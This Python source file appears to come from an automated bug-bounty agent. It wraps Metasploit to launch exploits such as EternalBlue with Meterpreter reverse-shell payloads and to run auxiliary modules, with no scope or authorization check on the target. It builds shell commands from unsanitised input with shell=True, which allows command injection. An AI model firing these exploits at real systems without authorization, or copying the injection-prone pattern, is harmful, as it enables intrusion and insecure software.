"""
BugBountyAgent - Metasploit Framework Wrapper
===============================================
Wrapper for Metasploit Framework integration.
"""

import os
import subprocess
import time
import json
import re
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from core.config import Config
from core.utils import log_info, log_error, log_warning, log_debug


@dataclass
class ExploitResult:
    """Result from a Metasploit exploit attempt."""
    success: bool
    output: str
    error: str
    session_id: Optional[int] = None
    payload: Optional[str] = None
    target: Optional[str] = None


class MetasploitWrapper:
    """
    Wrapper for Metasploit Framework integration.
    Supports running exploits and post-exploitation modules.
    """
    
    def __init__(self, config: Config):
        self.config = config
        self.tool_config = config.get('tools.metasploit', {})
        self.enabled = self.tool_config.get('enabled', False)
        self.path = self.tool_config.get('path', '/usr/bin/msfconsole')
        self.data_dir = self.tool_config.get('data_dir', '/usr/share/metasploit-framework')
        
        self._available = None
        self._version = None
    
    def is_available(self) -> bool:
        """Check if Metasploit is installed and available."""
        if self._available is not None:
            return self._available
        
        if not self.enabled:
            self._available = False
            return False
        
        try:
            result = subprocess.run(
                [self.path, '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            self._available = result.returncode == 0
            if self._available:
                lines = result.stdout.strip().split('\n')
                self._version = lines[0] if lines else 'unknown'
                log_info(f"✅ Metasploit {self._version} available at {self.path}")
            else:
                log_warning("Metasploit not available")
        except Exception as e:
            log_error(f"Metasploit check failed: {e}")
            self._available = False
        
        return self._available
    
    def get_version(self) -> Optional[str]:
        """Get Metasploit version."""
        if self.is_available():
            return self._version
        return None
    
    def run_exploit(self, exploit: str, target: str, 
                    options: Dict[str, str] = None,
                    payload: str = None, timeout: int = 300) -> ExploitResult:
        """
        Run a Metasploit exploit.
        
        Args:
            exploit: Exploit path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
            target: Target IP or hostname
            options: Exploit options (e.g., {'RHOSTS': '192.168.1.100', 'RPORT': '445'})
            payload: Payload to use (e.g., 'windows/x64/meterpreter/reverse_tcp')
            timeout: Command timeout in seconds
            
        Returns:
            ExploitResult: Result of the exploit attempt
        """
        if not self.is_available():
            log_error("Metasploit not available")
            return ExploitResult(success=False, output='', error='Metasploit not available')
        
        # Build command
        cmd = f"{self.path} -q -x 'use {exploit}; set RHOSTS {target};"
        
        # Add options
        if options:
            for key, value in options.items():
                cmd += f" set {key} {value};"
        
        # Add payload
        if payload:
            cmd += f" set PAYLOAD {payload};"
            # Add default LHOST if not set
            if 'LHOST' not in (options or {}):
                cmd += f" set LHOST 127.0.0.1;"
        
        # Add run command
        cmd += " run; exit'"
        
        log_info(f"💀 Running exploit {exploit} on {target}")
        log_debug(f"Command: {cmd[:200]}...")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=True
            )
            
            success = result.returncode == 0 and 'Meterpreter session' in result.stdout
            session_id = None
            
            # Extract session ID if successful
            if success:
                session_match = re.search(r'Meterpreter session (\d+) opened', result.stdout)
                if session_match:
                    session_id = int(session_match.group(1))
            
            return ExploitResult(
                success=success,
                output=result.stdout,
                error=result.stderr,
                session_id=session_id,
                payload=payload,
                target=target
            )
            
        except subprocess.TimeoutExpired:
            log_error(f"Exploit timed out after {timeout}s")
            return ExploitResult(
                success=False,
                output='',
                error=f'Timeout after {timeout}s',
                target=target
            )
        except Exception as e:
            log_error(f"Exploit failed: {e}")
            return ExploitResult(
                success=False,
                output='',
                error=str(e),
                target=target
            )
    
    def run_module(self, module: str, options: Dict[str, str] = None,
                   timeout: int = 120) -> Dict[str, Any]:
        """
        Run a Metasploit auxiliary module.
        
        Args:
            module: Module path (e.g., 'auxiliary/scanner/portscan/tcp')
            options: Module options
            timeout: Command timeout in seconds
            
        Returns:
            Dict[str, Any]: Module output
        """
        if not self.is_available():
            return {'success': False, 'error': 'Metasploit not available'}
        
        # Build command
        cmd = f"{self.path} -q -x 'use {module};"
        
        if options:
            for key, value in options.items():
                cmd += f" set {key} {value};"
        
        cmd += " run; exit'"
        
        log_info(f"🔍 Running module {module}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=True
            )
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': f'Timeout after {timeout}s'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def run_auxiliary(self, module: str, target: str,
                      port: int = None, timeout: int = 120) -> Dict[str, Any]:
        """
        Run an auxiliary module on a target.
        
        Args:
            module: Auxiliary module name
            target: Target IP or hostname
            port: Target port (optional)
            timeout: Command timeout in seconds
            
        Returns:
            Dict[str, Any]: Module output
        """
        options = {'RHOSTS': target}
        if port:
            options['RPORT'] = str(port)
        
        return self.run_module(f'auxiliary/{module}', options, timeout)
    
    def search_exploits(self, query: str) -> List[Dict[str, str]]:
        """
        Search for exploits by keyword.
        
        Args:
            query: Search query
            
        Returns:
            List[Dict[str, str]]: List of matching exploits
        """
        if not self.is_available():
            return []
        
        try:
            cmd = f"{self.path} -q -x 'search {query}; exit'"
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True)
            
            exploits = []
            for line in result.stdout.split('\n'):
                if 'exploit' in line.lower():
                    parts = line.split()
                    if len(parts) >= 3:
                        exploits.append({
                            'name': parts[0],
                            'type': parts[1] if len(parts) > 1 else 'unknown',
                            'description': ' '.join(parts[2:]) if len(parts) > 2 else ''
                        })
            
            return exploits
            
        except Exception as e:
            log_error(f"Search failed: {e}")
            return []
    
    def get_payloads(self) -> List[str]:
        """Get list of available payloads."""
        if not self.is_available():
            return []
        
        try:
            cmd = f"{self.path} -q -x 'show payloads; exit'"
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True)
            
            payloads = []
            for line in result.stdout.split('\n'):
                if '/' in line and not line.startswith('='):
                    parts = line.split()
                    if parts and '/' in parts[0]:
                        payloads.append(parts[0])
            
            return payloads
            
        except Exception as e:
            log_error(f"Failed to get payloads: {e}")
            return []